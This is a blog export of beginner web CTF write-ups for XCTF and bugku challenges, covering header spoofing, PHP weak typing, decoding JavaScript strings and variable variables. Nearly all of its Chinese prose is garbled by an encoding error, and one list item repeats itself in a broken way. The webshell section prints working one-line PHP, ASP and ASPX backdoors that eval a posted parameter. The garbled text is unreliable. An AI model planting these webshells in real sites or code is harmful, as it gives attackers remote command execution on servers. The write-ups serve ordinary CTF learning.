<p>ï¼ˆ1ï¼‰<strong>X-Forwarded-For:</strong>  ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚xff æ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚æ ¼å¼ä¸ºï¼šX-Forwarded-For: æœ¬æœºIP, ä»£ç†1IP, ä»£ç†2IP, ä»£ç†2IP</p>
<p>ï¼ˆ2ï¼‰<strong>HTTP Referer:</strong>  æ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯<em>ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥</em>çš„ï¼ŒæœåŠ¡å™¨åŸºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚referer æ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯è®°å½•å½“å‰è¯·æ±‚é¡µé¢çš„æ¥æºé¡µé¢çš„åœ°å€ã€‚æœåŠ¡å™¨ä½¿ç”¨refererç¡®è®¤è®¿é—®æ¥æºï¼Œå¦‚æœrefererå†…å®¹ä¸ç¬¦åˆè¦æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æ‹¦æˆªæˆ–è€…é‡å®šå‘è¯·æ±‚ã€‚</p>
<br>
<p>æˆ‘ä»¬å…ˆè®¾ç½®xffä¸º123.123.123.123å‘é€è¯·æ±‚åŒ…ï¼ŒæŸ¥çœ‹åŒ…ä¿¡æ¯</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/PQ7F0J%5BF%5BQ1IFZ%605C%29_4PV2.png" alt=""></p>
<br>
<p>æç¤ºæˆ‘ä»¬åœ°å€å¿…é¡»æ¥è‡ªhttps://www.google.com</p>
<p>æ‰€ä»¥æˆ‘ä»¬åŠ ä¸Šrefererä¿¡æ¯</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/6TO%40YJZ5U~~H1O_Z3%40%24X%7DP5.png" alt=""></p>
<p>å‘ç°å“åº”åŒ…é‡Œå«æœ‰flagï¼ŒæˆåŠŸï¼è¿™é“é¢˜è¿˜å¯ä»¥ä½¿ç”¨æˆ‘ä»¬å¼ºå¤§çš„curlå‘½ä»¤è¡Œå·¥å…·</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/xff_referer/M9MHWII6E%2841I0Y8Z%7BB%7DQPW.png" alt=""></p>
</li>
<li>
<h2 id="webshell"><a class="header-anchor" href="#webshell">Â¶</a>webshell</h2>
<hr>
<p>è¿™é“é¢˜è€ƒçš„æ˜¯webshellï¼Œè¯¶ï¼Œä½ ä¸çŸ¥é“ä»€ä¹ˆæ˜¯webshellå—ï¼Ÿwebshellå°±æ˜¯webä¸‹çš„shell ï¼Œä¹Ÿå°±æ˜¯webç½‘ç«™çš„åé—¨ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5D3B~6AJ6BIRTDI62TL%5BH9PY.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/FW8AU7XJALI0HR1%29RZ4%7B%7BQW.png" alt=""></p>
<p>é¡µé¢å·²ç»ç»™å‡ºæˆ‘ä»¬shellï¼Œä¹Ÿæ˜¯å¸¸ç”¨çš„phpä¸€å¥è¯æœ¨é©¬</p>
<p>åŒæ—¶å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬æœ‰ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</span><br><span class="line">aspçš„ä¸€å¥è¯æ˜¯ï¼š   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspxçš„ä¸€å¥è¯æ˜¯ï¼š  &lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>
<p>ç»™å‡ºè¿æ¥å¯†ç webshellï¼Œé‚£æˆ‘ä»¬ç›´æ¥èšå‰‘è¿æ¥å°±å¥½</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png" alt=""></p>
<p>ç„¶åè¿æ¥åˆ°åå°ï¼Œåœ¨é‡Œé¢æ‰¾åˆ°flagæ–‡ä»¶ï¼Œæ‰“å¼€è·å–flagå³å¯~</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/%5DS%244%25EXCQ1PS03D%5B%7DCP5%7DDL.png" alt=""></p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/webshell/Z5%25II2N4%254R~%29R8DY~%405AN4.png" alt=""></p>
</li>
<li>
<h2 id="simple-js"><a class="header-anchor" href="#simple-js">Â¶</a>simple_js</h2>
<hr>
<p>æ‰“å¼€é¢˜ç›®ï¼Œé¢˜ç›®åå­—å‘Šè¯‰æˆ‘ä»¬å’Œjsæœ‰å…³ï¼Œè¿™è®©æˆ‘ç€å®æ…Œäº†ä¸€ä¼šï¼Œå› ä¸ºæˆ‘å¯¹jsæ²¡æœ‰æ€ä¹ˆå»å­¦è¿‡ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/%28A4HX0%24I98LMS1_M%60%5BD2OEA.png" alt=""></p>
<p>æ‰“å¼€é¡µé¢åå¼¹å‡ºä¸€ä¸ªè¾“å…¥å¯†ç çš„æ¡†ï¼Œä¹±è¾“ä¸€é˜µï¼Œå“ˆå“ˆå—ã€‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/ZX%40BKAX1E%7DD3IZWJ%25%25DQ4IM.png" alt=""></p>
<p>è¿”å›ä¸€æ®µè‹±æ–‡ï¼Œæ˜¾ç¤ºå‘Šè¯‰æˆ‘ä»¬è¿™æ˜¯å‡å¯†ç ï¼Œæˆ‘ä»¬å»æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ä¸œè¥¿ï¼Œè¯¶ï¼Œå‘ç°äº†ï¼æˆ‘ä»¬å°è¯•å®¡è®¡ä¸€ä¸‹ä»£ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/K%25%29ZR5%25N%24XC236QA~5FVBMB.png" alt=""></p>
<p>å‘ç°å®šä¹‰äº†ä¸€äº›å‚æ•°å’Œå¥½åƒæœ‰ç‚¹å¤šä½™çš„forå¾ªç¯ï¼Œå¥½å§ï¼Œæœ‰ç‚¹è¿·ï¼Œæœ€åä¸€ä¸ªå¼¹çª—ä¹Ÿæ˜¯å’Œå‰é¢å®šä¹‰çš„å‚æ•°æ¯«æ— å…³ç³»ã€‚ä¸è¿‡å‘ç°æœ‰ä¸ªå¯ç–‘çš„å˜é‡å’Œdechiffreåé¢è·Ÿç€çš„å­—ç¬¦ä¸²ã€‚å°è¯•è§£ç ä¸€ä¸‹passï¼Œè¿™å˜é‡åå­—ä¸é”™ï¼Œå¸Œæœ›æœ‰ç‚¹ç”¨ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">    print(chr(i),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/simple_js/SD%28%5D9%60%7BB%25WGN1%5DS2_%288H8JT.png" alt=""></p>
<p>è§£ç å¾—åˆ°å¼¹æ¡†çš„æç¤ºæ¶ˆæ¯ï¼Œé‚£æˆ‘ä»¬å†è§£ä¸€ä¸‹ä¸‹é¢é‚£ä¸€ä¸²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span></span><br><span class="line">  s_list = string.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> s_list:</span><br><span class="line">      i = chr(int(i))</span><br><span class="line">      res += i</span><br><span class="line">  print(res)</span><br></pre></td></tr></table></figure>
<p>çœ‹èµ·æ¥ä¸åƒæ˜¯ä»€ä¹ˆåŠ å¯†çš„ç»“æ„ï¼Œè¿™è®©æˆ‘æœ‰ç‚¹è¿·ã€‚æ·¦ï¼Œå¿½ç„¶æƒ³èµ·æ¥å‰é¢é¢˜ç›®å¼€å§‹å°±æç¤ºæˆ‘ä»¬flgaç»“æ„ï¼Œäºæ˜¯æ‹¿ç€å­—ç¬¦ä¸²å»æ„é€ äº†ä¸€ä¸‹flagæäº¤ï¼ŒCyberpeace{786OsErtk12}ï¼Œå‘ç°å±…ç„¶æˆåŠŸäº†~</p>
</li>
</ul>
<h1>é«˜æ‰‹è¿›é˜¶åŒº</h1>
<ul>
<li>
<h2 id="baby-web"><a class="header-anchor" href="#baby-web">Â¶</a>baby_web</h2>
<hr>
<p>æœ‰ç‚¹æ¿€åŠ¨ï¼Œç»ˆäºåˆ°é«˜æ‰‹webè¿›é˜¶åŒºäº†ï¼Œæ…¢æ…¢èµ°å‘é«˜æ‰‹çš„è·¯äº†æ˜¯ä¸æ˜¯ï¼Ÿå¥½å§å¥½å§ï¼Œä¸å¹äº†ï¼Œæ¥çœ‹çœ‹é¢˜ç›®</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/2QD4IVBA_IZPP_%2425STG%28%28N.png" alt=""></p>
<p>é¢˜ç›®æç¤ºæˆ‘ä»¬æ˜¯åˆå§‹é¡µé¢ï¼Œæ‰“å¼€æ˜¯ä¸€ä¸ª1.phpï¼Œå°è¯•è¾“å…¥äº†ä¸€ä¸‹index.php,å‘ç°å­˜åœ¨è¿™ä¸ªé¡µé¢ï¼Œä½†302è·³è½¬äº†</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/VC70ZU3IO_B8ZM7Q%28~93O%5DX.png" alt=""></p>
<p>ç„¶åä½¿ç”¨curlè¯·æ±‚ä¸€ä¸‹ï¼Œcurlå·¥å…·é»˜è®¤ä¸éšç€302è·³è½¬</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/HY40G4%601ZEH%7DEGO2EN%25~498.png" alt=""></p>
<p>flagå°±å‡ºæ¥äº†ï¼Œå¦¥å¦¥çš„ç­¾åˆ°é¢˜å‘€å“ˆå“ˆå—ã€‚</p>
<p>åæ¥å‘ç°å…¶å®åˆšå¼€å§‹å°±å·²ç»ç»™å‡ºflagäº†ï¼Œæ±—ï¼</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/baby_web/YY4%24SZRJG~%7DGSJ%5DHWPE~6XO.png" alt=""></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>bugkuå¹³å°webé¢˜ç›®ï¼ˆæ–°æ‰‹æ¨èï¼‰</title>
    <url>/posts/55334/</url>
    <content><![CDATA[<ol>
<li>
<h2 id="web2"><a class="header-anchor" href="#web2">Â¶</a>web2</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œæ˜¯ä¸€ç¾¤ä¼šåŠ¨çš„æ»‘ç¨½ï¼Œè¿˜è¶ŠåŠ¨è¶Šå¿«ï¼Œå“ˆå“ˆå“ˆ</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web2/6YPR%25%7B%40PNPA%5BNUEN%7BBW6VGQ.png" alt=""></p>
<p>å¥½å•¦ï¼Œçœ‹èµ·æ¥é¡µé¢ç»™ä¸å‡ºä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æºä»£ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web2/7%60CZ6H%24XMN37HSV%40%5BKG%40%60YW.png" alt=""></p>
<p>å‘ç°flagï¼Œé€šå…³ï¼</p>
</li>
<li>
<h2 id="è®¡ç®—å™¨"><a class="header-anchor" href="#è®¡ç®—å™¨">Â¶</a>è®¡ç®—å™¨</h2>
<p>è¿›å…¥ç¯å¢ƒåï¼Œå‘ç°ç»™å‡ºä¸€ä¸²æ•°å­—è®¡ç®—ï¼Œä½†æ€ä¹ˆä¹Ÿè¾“å…¥ä¸äº†è¶…è¿‡ä¸¤ä½æ•°çš„æ•°å­—ï¼Œåªèƒ½è¾“å…¥ä¸€ä½</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/R%60T%5B%60G~%24KK_4G73~~FWC%40YY.png" alt=""></p>
<p>çŒœæµ‹æ˜¯å‰ç«¯é™åˆ¶ï¼Œæ‰“å¼€åï¼Œä¿®æ”¹1æ•°å€¼ä¸º2ï¼Œå°±å¯ä»¥è¾“å…¥ä¸¤ä½æ•°å­—äº†ï¼Œç„¶åæäº¤è·å–flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/%28RKID%60YAVX1ZTCXS9%7B3%7D~KU.png" alt=""></p>
<p>å½“ç„¶ï¼Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯å»æ‰¾ä»–çš„jsæ–‡ä»¶ï¼Œæ‰¾äº†ä¸€ä¸‹ï¼Œå‘ç°flagäº†</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E8%AE%A1%E7%AE%97%E5%99%A8/51MY%5B%7DSCM%29%60XKFO4SI8Z3%7DM.png" alt=""></p>
</li>
<li>
<h2 id="GET"><a class="header-anchor" href="#GET">Â¶</a>$_GET</h2>
<p>çœ‹é¢˜ç›®ä¹ŸçŸ¥é“æ˜¯getæ–¹å¼å‘é€è¯·æ±‚ï¼Œæ‰“å¼€åçœ‹é¡µé¢ç»™å‡ºçš„ä»£ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/get/UZAL7ME3%7BJQ7OQ%7BCE1VC193.png" alt=""></p>
<p>æŸ¥çœ‹ä»£ç ï¼Œå‘Šè¯‰æˆ‘ä»¬ä¼ å‚ç»™whatï¼Œå½“ä¼ çš„å‚æ•°å€¼ä¸ºflagï¼Œè¾“å‡ºflag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/get/YINKR%28%29%7BP6602C3PPQ%60C%7B15.png" alt=""></p>
<p>ok,è·å–åˆ°flagã€‚</p>
</li>
<li>
<h2 id="POST"><a class="header-anchor" href="#POST">Â¶</a>$_POST</h2>
<p>è¿™æ¬¡è¦æ±‚æˆ‘ä»¬ä½¿ç”¨postæ–¹å¼ä¼ å‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/post/J%7B4QX%29%5DODJBTH%257%25PJZVRH2.png" alt=""></p>
<p>å’Œä¸Šé“é¢˜ç›®ä¸€æ ·ï¼Œéœ€è¦å¯¹whatå‚æ•°ä¼ å‚flagå›æ˜¾ç­”æ¡ˆï¼Œä½†æˆ‘ä»¬ä¸æ˜¯ä½¿ç”¨getæ–¹å¼ï¼Œè€Œæ˜¯ä½¿ç”¨postæ–¹å¼è¿›è¡Œè¯·æ±‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/post/UI%259OG4%7D99JEQ%7D4QQB%24U_S1.png" alt=""></p>
<p>å›æ˜¾flagï¼Œé€šå…³ã€‚</p>
</li>
<li>
<h2 id="çŸ›ç›¾"><a class="header-anchor" href="#çŸ›ç›¾">Â¶</a>çŸ›ç›¾</h2>
<p>æ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹ç»™å‡ºçš„ä»£ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/WM9ZE87%29%7BBW9%25ERIN9%7BW%248Y.png" alt=""></p>
<p>ä¾ç„¶ç”¨getæ–¹å¼å¯¹å‚æ•°numä¼ å€¼ï¼Œä½†è¿™æ¬¡å¤šäº†ä¸€ä¸ª<strong>is_numeric()å‡½æ•°</strong>å’Œä¸€ä¸ª<strong>ifåˆ¤æ–­</strong>ã€‚</p>
<blockquote>
<p>isnumeric( )è¿˜æ˜¯ä¸€ä¸ªå¾ˆå®ç”¨çš„å‡½æ•°ï¼Œåœ¨ç®—æ³•é¢˜ç›®é‡Œé¢åº”è¯¥ä¼šæœ‰æ¯”è¾ƒå¤§çš„ä½œç”¨ã€‚</p>
<p>æ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦åªç”±æ•°å­—ç»„æˆï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸­åªåŒ…æ‹¬æ•°å­—ï¼Œå°±è¿”å›Tureï¼Œå¦åˆ™è¿”å›Falseã€‚</p>
</blockquote>
<p>åŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“phpçš„å¼±ç±»å‹æ¯”è¾ƒï¼Œä¾‹å¦‚â€™123aâ€™ä¼šè¢«è½¬æ¢æˆâ€™123â€™,å­—ç¬¦ä¸²çš„å¼€å¤´éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ã€‚å¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å­—å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å­—è‡³å’Œä»–è¿ç»­çš„æœ€åä¸€ä¸ªæ•°å­—ç»“æŸï¼Œå¦åˆ™å…¶æ¯”è¾ƒæ—¶æ•´ä½“å€¼ä¸º0ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬æ—¢è¦æ»¡è¶³ç¬¬ä¸€ä¸ªä¸æ˜¯çº¯æ•°å­—åˆè¦æ•°å€¼ä¸Šç­‰äº1</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E7%9F%9B%E7%9B%BE/OO%7D2%40M0%4076CCULY%5D3GNA%40QL.png" alt=""></p>
<p>æˆåŠŸï¼Œè·å–flagã€‚</p>
</li>
<li>
<h2 id="web3"><a class="header-anchor" href="#web3">Â¶</a>web3</h2>
<p>æ‰“å¼€é¢˜ç›®ç¯å¢ƒï¼Œæœ‰ä¸€ä¸ªå¼¹æ¡†ï¼Œä¸€ç›´ç‚¹éƒ½ä¸€ç›´å¼¹å‡ºï¼Œf12ç‚¹ä¸å¼€å¼€å‘è€…å·¥å…·ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥urlè¯·æ±‚æŸ¥çœ‹æºä»£ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/%25WTF6%5D64VA%2846%5DGK7~%5B6%7BAM.png" alt=""></p>
<p>æ‹‰åˆ°åº•ä¸‹ï¼Œå‘ç°ä¸€ä¸²unicodeç¼–ç </p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/S3AKL%5BJ%40%296T%25Z%5BWB8CAS7IC.png" alt=""></p>
<p>æŠŠå®ƒè½¬æˆAsciiç å³å¯è§£å¯†è·å–flagå‘¦</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/web3/K%7DOPCINA9JMUUT6NFY1IT71.png" alt=""></p>
</li>
<li>
<h2 id="åŸŸåè§£æ"><a class="header-anchor" href="#åŸŸåè§£æ">Â¶</a>åŸŸåè§£æ</h2>
<p>é¢˜ç›®æç¤ºæˆ‘ä»¬è§£æåŸŸå</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/HK%5DCS7TD%60%5BU9_SC%60H3%28%7B%25FE.png" alt=""></p>
<p>æŒ‰ç…§é¢˜ç›®è¦æ±‚æŠŠflag.baidu.comè§£æåˆ°123.206.87.240ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æœ¬åœ°çš„hostsæ–‡ä»¶é‡Œå†™å…¥</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/%5D4%28BG%28N5%7DD%28Y%40KWWD~ISX~B.png" alt=""></p>
<p>å†è®¿é—®flag.baidu.comå³å¯å¾—åˆ°flag</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/BC%5BB1EG9A%5D%7BSO%28%5DTKKV%605Z7.png" alt=""></p>
</li>
<li>
<h2 id="ä½ å¿…é¡»è®©ä»–åœä¸‹"><a class="header-anchor" href="#ä½ å¿…é¡»è®©ä»–åœä¸‹">Â¶</a>ä½ å¿…é¡»è®©ä»–åœä¸‹</h2>
<p>æ‰“å¼€é¡µé¢ï¼Œæ˜¯ä¸€ä¸ªä¸åœåˆ·æ–°çš„ç”»é¢</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/_J5%28NO03FKQI%5BU%5D%7B0QOIL1L.png" alt=""></p>
<p>ä»”ç»†è§‚å¯Ÿäº†ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸€æ¬¡è¯·æ±‚ä¸­æºä»£ç ä¼šæ˜¾ç¤ºå‡ºflagï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨burpsuiteæŠ“åŒ…ï¼Œç„¶åè¿›è¡Œè‹¥å¹²æ¬¡å‘é€è¯·æ±‚</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B%E6%9D%A5/WLO9%24%5B0%40N%7D96OW%5B%25F%60Q626H.png" alt=""></p>
<p>åœ¨è¯·æ±‚å›¾ç‰‡åå­—ä¸º10çš„æ—¶å€™ï¼Œæš´éœ²å‡ºflagã€‚</p>
</li>
<li>
<h2 id="æœ¬åœ°åŒ…å«"><a class="header-anchor" href="#æœ¬åœ°åŒ…å«">Â¶</a>æœ¬åœ°åŒ…å«</h2>
<p>é¢˜ç›®ç¯å¢ƒæ‰“ä¸å¼€ï¼Œå¯èƒ½å¹³å°å‡ºé—®é¢˜äº†ï¼Œæš‚æ—¶è·³è¿‡â€¦</p>
</li>
<li>
<h2 id="å˜é‡1"><a class="header-anchor" href="#å˜é‡1">Â¶</a>å˜é‡1</h2>
<p>æ‰“å¼€é¢˜ç›®ï¼Œç»™å‡ºphpä»£ç ï¼Œæˆ‘ä»¬è¿›è¡Œä¸€æ³¢ä»£ç å®¡è®¡</p>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/bugku/%E5%8F%98%E9%87%8F1/TID%7DDC4B%283WM90Y_%5D%60DLX2X.png" alt=""></p>
<p>é¦–å…ˆéœ€è¦å¯¹argsç”¨getæ–¹å¼è¿›è¡Œä¸€ä¸ªä¼ å‚ï¼Œç¬¬ä¸€ä¸ªifé‡Œé¢å«æœ‰æ­£åˆ™ï¼Œå¯¹ä¸€äº›å­—ç¬¦è¿›è¡Œäº†ä¸€ä¸ªè¿‡æ»¤ï¼Œè¿˜å‘ç°ä¸‹é¢<strong>var_dump</strong>é‡Œçš„å˜é‡æœ‰ä¸¤ä¸ª$$ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯å˜å˜é‡ã€‚</p>
<blockquote>
<p>å¯å˜å˜é‡æ˜¯ä¸€ç§ç‹¬ç‰¹çš„å˜é‡ï¼Œå®ƒå…è®¸åŠ¨æ€æ”¹å˜ä¸€ä¸ªå˜é‡åç§°ã€‚å…¶å·¥ä½œåŸç†æ˜¯è¯¥å˜é‡çš„åç§°ç”±å¦ä¸€ä¸ªå˜é‡çš„å€¼æ¥ç¡®å®šï¼Œå®ç°è¿‡ç¨‹å°±æ˜¯åœ¨å˜é‡çš„å‰é¢å†å¤šåŠ ä¸€ä¸ªç¾å…ƒç¬¦å·â€œ$â€.</p>
</blockquote>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹argsä¼ ä¸€ä¸ªå˜é‡çš„å€¼ï¼Œé€šè¿‡var_dumpæ¥æ˜¾ç¤ºå®ƒçš„ä¿¡æ¯ï¼Œphpä¸­çš„å…¨å±€å˜é‡æœ‰ä»¥ä¸‹å‡ ç§</p>
<blockquote>
<ul>
<li>$_POST [ç”¨äºæ¥æ”¶postæäº¤çš„æ•°æ®]</li>
<li>$_GET [ç”¨äºè·å–urlåœ°å€æ çš„å‚æ•°æ•°æ®]</li>
<li>$_FILES [ç”¨äºæ–‡ä»¶å°±æ”¶çš„å¤„ç†img æœ€å¸¸è§]</li>
<li>$_COOKIE [ç”¨äºè·å–ä¸setCookie()ä¸­çš„name å€¼]</li>
<li>$_SESSION [ç”¨äºå­˜å‚¨sessionçš„å€¼æˆ–è·å–sessionä¸­çš„å€¼]</li>
<li>$_REQUEST [å…·æœ‰get,postçš„åŠŸèƒ½ï¼Œä½†æ¯”è¾ƒæ…¢]</li>
<li>SERVER[æ˜¯é¢„å®šä¹‰æœåŠ¡å™¨å˜é‡çš„ä¸€ç§ï¼Œæ‰€æœ‰SERVER[æ˜¯é¢„å®šä¹‰æœåŠ¡å™¨å˜é‡çš„ä¸€ç§ï¼Œæ‰€æœ‰_SERVER [æ˜¯é¢„å®šä¹‰æœåŠ¡å™¨å˜é‡çš„ä¸€ç§ï¼Œæ‰€æœ‰_SERVERå¼€å¤´çš„éƒ½</li>
<li>$GLOBALS [ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„]</li>
